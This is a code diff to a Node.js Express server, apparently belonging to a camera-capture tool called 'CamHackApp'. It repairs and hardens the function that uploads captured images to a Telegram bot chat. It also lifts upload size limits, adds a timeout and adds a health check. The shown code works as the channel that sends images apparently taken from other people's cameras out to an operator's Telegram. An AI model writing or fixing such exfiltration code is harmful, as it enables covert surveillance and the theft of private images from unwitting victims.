@@ -4,6 +4,7 @@ const path = require('path');
 const fs = require('fs');
 const cors = require('cors');
 const axios = require('axios');  // Telegram API call
+const FormData = require('form-data');
 require('dotenv').config();
 
 const app = express();
@@ -50,11 +51,17 @@ async function sendToTelegram(filePath, caption = 'New capture from CamHackApp')
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
-        formData.append('photo', fs.createReadStream(filePath));
+        formData.append('photo', fs.createReadStream(filePath), {
+            filename: path.basename(filePath),
+            contentType: 'image/jpeg'
+        });
         formData.append('caption', caption);
 
         const response = await axios.post(url, formData, {
-            headers: { 'Content-Type': 'multipart/form-data' }
+            headers: formData.getHeaders(),
+            maxContentLength: Infinity,
+            maxBodyLength: Infinity,
+            timeout: 30000
         });
         return response.data.ok === true;
     } catch (error) {
@@ -103,6 +110,14 @@ app.get('/api/images', (req, res) => {
             }))
             .sort((a, b) => b.timestamp - a.timestamp);
         res.json(images);
+    });
+});
+
+// Safe configuration health check (never returns secrets)
+app.get('/api/health', (req, res) => {
+    res.json({
+        ok: true,
+        telegramConfigured: Boolean(BOT_TOKEN && CHAT_ID)
     });
 });
 
